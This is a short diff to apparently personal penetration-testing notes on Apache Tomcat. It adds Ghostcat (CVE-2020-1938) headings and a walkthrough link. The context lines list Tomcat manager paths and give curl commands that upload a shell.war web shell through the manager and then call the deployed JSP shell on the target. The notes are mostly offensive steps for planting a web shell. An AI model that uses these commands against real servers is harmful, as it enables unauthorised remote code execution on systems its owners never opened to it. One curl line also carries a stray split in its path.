@@ -1,6 +1,6 @@
+# Apache Tomcat
 
-
-[Ghostcat]()
+## Ghostcat
 /manager/
 /manager-gui/
 Upload should not necessarily require username and password
@@ -13,3 +13,5 @@ curl -u '[USERNAME]:[PASSWORD]' --upload-file shell.war "http://$IP:8080/mana ge
 # Check the file
 curl -u '[USERNAME]:[PASSWORD]' "http://$IP:8080/shell/$FILE.jsp
 ```
+
+[Apache Ghostcat](https://medium.com/@sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23)
